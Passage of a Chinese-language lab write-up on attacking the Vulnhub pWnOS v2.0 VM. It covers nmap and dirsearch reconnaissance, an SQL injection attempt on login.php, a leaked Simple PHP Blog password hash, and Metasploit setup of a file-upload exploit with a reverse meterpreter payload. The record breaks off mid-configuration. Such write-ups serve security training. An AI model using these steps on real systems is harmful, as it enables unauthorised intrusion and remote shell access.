{"pageProps":{"postData":{"id":"VulnhubpWnOS v2 0","contentHtml":"<h1>pWnOS v2.0</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/pwnos-20-pre-release,34/\">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>150</code>为靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-24 12:44 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00013</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00015</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.150</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>D:<span class=\"hljs-number\">85</span>:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00010</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机所有端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.150</span>   \n<span class=\"hljs-comment\">//                 </span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-24 12:48 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.150</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>D:<span class=\"hljs-number\">85</span>:<span class=\"hljs-number\">45</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span>  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.150</span> \n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-24 12:49 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.150</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00046</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">5.8</span>p1 Debian <span class=\"hljs-number\">1</span>ubuntu3 (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">17</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>D:<span class=\"hljs-number\">85</span>:<span class=\"hljs-number\">45</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">32</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">39</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p22,<span class=\"hljs-number\">80</span>  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span> \n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-24</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">50</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00044</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  ssh\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>cookie<span class=\"hljs-operator\">-</span>flags: \n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>: \n<span class=\"hljs-operator\">|</span>     PHPSESSID: \n<span class=\"hljs-operator\">|</span>       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">set</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>login.php: \n<span class=\"hljs-operator\">|</span>     PHPSESSID: \n<span class=\"hljs-operator\">|</span>       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">set</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>: \n<span class=\"hljs-operator\">|</span>     PHPSESSID: \n<span class=\"hljs-operator\">|</span>       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">set</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>index<span class=\"hljs-operator\">/</span>: \n<span class=\"hljs-operator\">|</span>     PHPSESSID: \n<span class=\"hljs-operator\">|</span>       httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">set</span>\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-operator\">/</span>register<span class=\"hljs-operator\">/</span>: \n<span class=\"hljs-operator\">|</span>     PHPSESSID: \n<span class=\"hljs-operator\">|</span>_      httponly flag <span class=\"hljs-keyword\">not</span> <span class=\"hljs-keyword\">set</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>vuln<span class=\"hljs-operator\">-</span>cve2017<span class=\"hljs-number\">-1001000</span>: ERROR: Script execution failed (use <span class=\"hljs-operator\">-</span>d <span class=\"hljs-keyword\">to</span> debug)\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>csrf: \n<span class=\"hljs-operator\">|</span> Spidering limited <span class=\"hljs-keyword\">to</span>: maxdepth<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">3</span>; maxpagecount<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">20</span>; withinhost<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>\n<span class=\"hljs-operator\">|</span>   Found the following possible CSRF vulnerabilities: \n<span class=\"hljs-operator\">|</span>     \n<span class=\"hljs-operator\">|</span>     Path: http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>login.php\n<span class=\"hljs-operator\">|</span>     Form id: \n<span class=\"hljs-operator\">|</span>     Form action: login.php\n<span class=\"hljs-operator\">|</span>     \n<span class=\"hljs-operator\">|</span>     Path: http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>register.php\n<span class=\"hljs-operator\">|</span>     Form id: \n<span class=\"hljs-operator\">|</span>_    Form action: register.php\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>dombased<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-enum: \n|   /blog/: Blog\n|   /login.php: Possible admin folder\n|   /login/: Login page\n|   /info.php: Possible information file\n|   /icons/: Potentially interesting folder w/ directory listing\n|   /includes/: Potentially interesting directory w/ listing on '</span>apache<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.17</span> (ubuntu)<span class=\"hljs-string\">'\n|   /index/: Potentially interesting folder\n|   /info/: Potentially interesting folder\n|_  /register/: Potentially interesting folder\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-keyword\">any</span> stored XSS vulnerabilities.\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>D:<span class=\"hljs-number\">85</span>:<span class=\"hljs-number\">45</span> (VMware)\n</code></pre>\n<p>难得发现疑似<code>csrf</code> ，但在靶机上用处好像不大，还发现了一些可能感兴趣的路径</p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-sql\">dirsearch <span class=\"hljs-operator\">-</span>u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span> <span class=\"hljs-operator\">-</span>x <span class=\"hljs-number\">403</span>\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">27</span>] Starting:                                                                                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">302</span> <span class=\"hljs-operator\">-</span>   <span class=\"hljs-number\">20</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>activate  <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span>  http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.100</span><span class=\"hljs-operator\">/</span>index.php      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">301</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">248</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>blog  <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span>  http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span><span class=\"hljs-operator\">/</span>blog<span class=\"hljs-operator\">/</span>            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">49</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>    <span class=\"hljs-number\">2</span>KB <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>blog<span class=\"hljs-operator\">/</span>                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">01</span>] <span class=\"hljs-number\">301</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">251</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>includes  <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span>  http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span><span class=\"hljs-operator\">/</span>includes<span class=\"hljs-operator\">/</span>    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">01</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">546</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>includes<span class=\"hljs-operator\">/</span>\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">02</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>    <span class=\"hljs-number\">9</span>KB <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>info                                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">02</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>    <span class=\"hljs-number\">9</span>KB <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>info.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login.php                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>super                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel.aspx                                \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>admin<span class=\"hljs-operator\">/</span>\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel.php\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel.js\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel.html\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>login\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>oauth<span class=\"hljs-operator\">/</span>                                     \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>admin<span class=\"hljs-operator\">/</span>admin.asp                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel.jsp                                 \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>index\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>administrator<span class=\"hljs-operator\">/</span>                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">05</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">629</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>login<span class=\"hljs-operator\">/</span>cpanel<span class=\"hljs-operator\">/</span>\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">723</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>register.php                                     \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">18</span>] <span class=\"hljs-number\">200</span> <span class=\"hljs-operator\">-</span>  <span class=\"hljs-number\">723</span>B  <span class=\"hljs-operator\">-</span> <span class=\"hljs-operator\">/</span>register            \n</code></pre>\n</li>\n<li>\n<p>访问敏感目录</p>\n<ul>\n<li><code>/blog/</code> blog博客页面</li>\n<li><code>/blog/login.php</code> blog登陆页面</li>\n<li><code>/info.php</code> phpinfo</li>\n</ul>\n<p>都是注册或者登陆界面</p>\n</li>\n<li>\n<p><code>/index.php</code>泄露了管理员邮箱尝试弱密码爆破<code>admin@isints.com</code> ，爆破失败</p>\n<ul>\n<li>\n<p>在<code>/login.php</code>界面尝试<code>sql</code>注入，在**<code>Email Address</code>** 后面加<code>'</code> 爆出sql语句</p>\n<pre><code class=\"hljs language-sql\">admin<span class=\"hljs-variable\">@isints</span>.com<span class=\"hljs-string\">'\n</span></code></pre>\n<pre><code class=\"hljs language-sql\">An error occurred <span class=\"hljs-keyword\">in</span> script <span class=\"hljs-string\">'/var/www/login.php'</span> <span class=\"hljs-keyword\">on</span> line <span class=\"hljs-number\">47</span>: Query: <span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> email<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">'admin@isints.com'' AND pass='</span><span class=\"hljs-number\">356</span>a192b7913b04c54574d18c28d46e6395428ab<span class=\"hljs-string\">' AND active IS NULL \n</span></code></pre>\n</li>\n<li>\n<p>加上<code>#</code>号闭合语句让语句为真</p>\n<pre><code class=\"hljs language-sql\">email<span class=\"hljs-operator\">=</span>admin<span class=\"hljs-variable\">@isints</span>.com<span class=\"hljs-string\">'#&#x26;pass=1&#x26;submit=Login&#x26;submitted=TRUE\n</span></code></pre>\n<p>提示：<code>WAF: SQL Injection Attack Detected. Details Logged. Denying Session. Goodbye!</code> 被WAF阻止了，换路子</p>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试寻找<code>/blog/</code> 的漏洞</p>\n<ul>\n<li>\n<p>打开<code>F12</code>，看看能不能查到是什么CMS，找到 <code>Simple PHP Blog 0.4.0</code> 可能就是CMS的名称</p>\n</li>\n<li>\n<p>网上查阅<code>Simple PHP Blog 0.4.0</code> 的漏洞</p>\n<p>敏感文件泄露：<a href=\"https://github.com/advisories/GHSA-p35h-cp5r-m46j\">https://github.com/advisories/GHSA-p35h-cp5r-m46j</a> ，在<code>/blog/config/</code> 泄露了<code>password.txt</code> 获得密码 <code>$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</code> 使用 hash-identifier 识别不到</p>\n</li>\n<li>\n<p>使用<code>msf</code>查找是否存在漏洞</p>\n<pre><code class=\"hljs language-sql\">msf6 <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">search</span> simple php blog\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nMatching Modules\n<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span>\n\n   #  Name                                      Disclosure <span class=\"hljs-type\">Date</span>  Rank       <span class=\"hljs-keyword\">Check</span>  Description\n   <span class=\"hljs-operator\">-</span>  <span class=\"hljs-comment\">----                                      ---------------  ----       -----  -----------</span>\n   <span class=\"hljs-number\">0</span>  exploit<span class=\"hljs-operator\">/</span>unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload  <span class=\"hljs-number\">2005</span><span class=\"hljs-number\">-08</span><span class=\"hljs-number\">-25</span>       excellent  Yes    Simple PHP Blog Remote Command Execution\n</code></pre>\n<p>存在，使用该<code>exploit</code>模块</p>\n<pre><code class=\"hljs language-sql\">msf6 <span class=\"hljs-operator\">></span> use exploit<span class=\"hljs-operator\">/</span>unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>使用该模块\n[<span class=\"hljs-operator\">*</span>] <span class=\"hljs-keyword\">No</span> payload configured, defaulting <span class=\"hljs-keyword\">to</span> php<span class=\"hljs-operator\">/</span>meterpreter<span class=\"hljs-operator\">/</span>reverse_tcp\nmsf6 exploit(unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">show</span> options <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>查看该模块需要配置什么\n\n<span class=\"hljs-keyword\">Module</span> options (exploit<span class=\"hljs-operator\">/</span>unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload):\n\n   Name     <span class=\"hljs-keyword\">Current</span> Setting  Required  Description\n   <span class=\"hljs-comment\">----     ---------------  --------  -----------</span>\n   Proxies                   <span class=\"hljs-keyword\">no</span>        A proxy chain <span class=\"hljs-keyword\">of</span> format type:host:port[,type:host:port][...]\n   RHOSTS                    yes       The target host(s), see https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>docs.metasploit.com<span class=\"hljs-operator\">/</span>docs<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">using</span><span class=\"hljs-operator\">-</span>metasploit<span class=\"hljs-operator\">/</span>basics<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">using</span><span class=\"hljs-operator\">-</span>\n                                       metasploit.html\n   RPORT    <span class=\"hljs-number\">80</span>               yes       The target port (TCP)\n   SSL      <span class=\"hljs-literal\">false</span>            <span class=\"hljs-keyword\">no</span>        Negotiate SSL<span class=\"hljs-operator\">/</span>TLS <span class=\"hljs-keyword\">for</span> outgoing connections\n   URI      <span class=\"hljs-operator\">/</span>sphpblog        yes       Sphpblog directory path\n   VHOST                     <span class=\"hljs-keyword\">no</span>        HTTP server virtual host\n\nPayload options (php<span class=\"hljs-operator\">/</span>meterpreter<span class=\"hljs-operator\">/</span>reverse_tcp):\n\n   Name   <span class=\"hljs-keyword\">Current</span> Setting  Required  Description\n   <span class=\"hljs-comment\">----   ---------------  --------  -----------</span>\n   LHOST  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>   yes       The listen address (an interface may be specified)\n   LPORT  <span class=\"hljs-number\">4444</span>             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   <span class=\"hljs-comment\">--  ----</span>\n   <span class=\"hljs-number\">0</span>   Automatic\n\n<span class=\"hljs-keyword\">View</span> the <span class=\"hljs-keyword\">full</span> <span class=\"hljs-keyword\">module</span> info <span class=\"hljs-keyword\">with</span> the info, <span class=\"hljs-keyword\">or</span> info <span class=\"hljs-operator\">-</span>d command.\n\nmsf6 exploit(unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span> <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>靶机ip\nrhosts <span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">></span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>\nmsf6 exploit(unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> rport <span class=\"hljs-number\">80</span>  <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>靶机端口\nrport <span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">></span> <span class=\"hljs-number\">80</span>\nmsf6 exploit(unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload) <span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">set</span> uri <span class=\"hljs-operator\">/</span>blog<span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>攻击目录\nuri <span class=\"hljs-operator\">=</span><span 